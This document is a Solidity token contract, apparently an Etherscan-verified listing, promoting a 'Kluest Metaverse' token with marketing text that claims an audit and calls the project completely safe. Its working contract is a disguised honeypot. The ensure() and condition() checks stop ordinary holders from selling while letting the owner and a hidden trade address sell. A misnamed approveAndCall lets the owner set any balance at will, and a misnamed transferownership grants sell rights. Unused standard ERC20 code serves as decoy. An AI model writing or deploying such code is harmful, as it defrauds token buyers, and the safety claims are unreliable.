/**
 *Submitted for verification at Etherscan.io on 2022-10-19
*/

/*
Kluest Metaverse Token
Kluest Token is created after the Kluest game and is built on the Ethereum Blockchain. Launched 
in September 2022, KLUEST is on a mission to bring crypto to the average person.  The Kluest is 
a virtual reality (VR) game that runs on the Ethereum Blockchain. Players explore a 3D virtual world 
and purchase digital with the native ERC20 token from KLUEST, which they own permanently.
All transactions are stored on the Ethereum blockchain. A new crypto birthed by members of the 
decentralized online community. The Kluest Metaverse is an ever expanding, immersive collection of 
virtual environments and experiences that transcends users from all around the world, into a world of 
simulated landscapes designed with the sole purpose of elevating the users interactive experience with 
other members of the community. Accessible through mobile Phone, take part in games hosted by us 
and our community and stand a chance at winning NFTs through community collaborations and more! 
We will continue to further develop and grow our Kluest Metaverse, and we’re even more excited to get 
to share each room and stage of development with the Kluest community being the first to have access, 
share ideas and come up with new possibilities that would otherwise not be possible. We look forward to 
sharing this adventure with you all, and to growing this with all of you, every step of the way.
Mission
Our mission is to become an all-rounder project on Ethereum where users from all protocols and networks 
can have access to the facilities of Kluest. Our team is working day and night to launch the new version of 
the game along with cross chain interoperability and metaverse! In this stage of its development, Kluest 
protocol has been launched Metaverse technology, where users are able to virtually witness the life. In 
addition to solely working for this cause, Kluest will also invite crypto users from other protocols to take their 
part in this prime cause. For this soon cross-chain interoperability network will be launched!
Vision
Our project’s vision is to make the crypto adaption more appealing to the masses bridging the gap between 
real word and cryptocurrency’s potential. This will help the e- commerce market take the next leap forward to 
better serving the people on what they need and when they need it while remaining anon.
KLUEST App
Enter the Metaverse Age with Kluest, a revolutionary platform that allows users to play and create adventures 
in the real world.Play our community’s incredible stories or embark upon an endless adventure in wherever you 
go. Adventurer, an experience where exploration, collection and epic battles go hand-in-hand.
Ecosystem 
The DeFi ecosystem is still incipient, but there are great expectations regarding the changes it can cause in the 
economy as a whole. In addition to directly contributing to the creation of disruptive solutions in the sector, 
platforms dedicated to decentralized finance offer solutions to a number of problems in the financial market, such 
as centralization of control, inefficiency, bureaucracy, and poor transparency.Like cryptocurrencies, DeFi platforms 
have a global reach and operate on a peer-to-peer model, meaning that trades are made directly between two 
people. In addition, they are pseudonymized and open to everyone. Their operating cost is greatly reduced when 
compared to traditional banks, since they do not need to spend money on offices, salaries, and bureaucracy.
Features of KLUEST
Solid vision and mission
We are confident and we strive to fulfil set objectives. Our plans are transparent to everyone and success is 
inevitable thanks to perfectly chosen goals. Kluest Metaverse is a project that will pioneer the market for the next 
few years, in which the Metaverse scheme will dominate the world and we will be its right hand.
Experience
Our experience in the DeFi world dates back to the beginning of 2020. During this time, we got to know hundreds 
of projects, the requirements of the most uncompromising investors and the needs of the market and users, which 
allows us to build a project that will meet all requirements, guaranteeing us success in the world of DeFi. Everyone 
on our team is a veteran of the scene and knows the market inside out.
Full Development Team
We work with experienced Solidity and Full Stack developers, thanks to which we are able to implement any technical 
objective we deem valuable. Our developers will meet any challenge and we are no strangers to anything! Our team is 
prepared and ready for action!
Security
To ensure full security of our project, we commissioned an audit of our contract by a highly recognized company, 
GEMZ! The Kluest project is completely safe! Kluest protects privacy by limiting the sharing of transaction details to only 
those involved in the transaction.
Valuable Utility
Our project will be fully based on delivering real usability, thanks to which it will gain more and more value and 
recognition in the world of Metaverse day by day.
Community
Building bonds is something we cannot avoid! Each of us is strongly connected to the project and the community that 
surrounds it. The same faces, the same nicknames are something that proves to us that it is worth building a community 
that will build a project together with us, for better and for worse. We count on each of you to contribute to building our 
great community!
KLUEST Tokenomics
Name: Kluest Metaverse
SYMBOL: $KLUEST
Network: Ethereum
Decimals: 18 
Token Type: Utility
Supply: 1.000.000.000 
Liquidity: Locked
*/
pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract KluestMetaverse {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
       if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}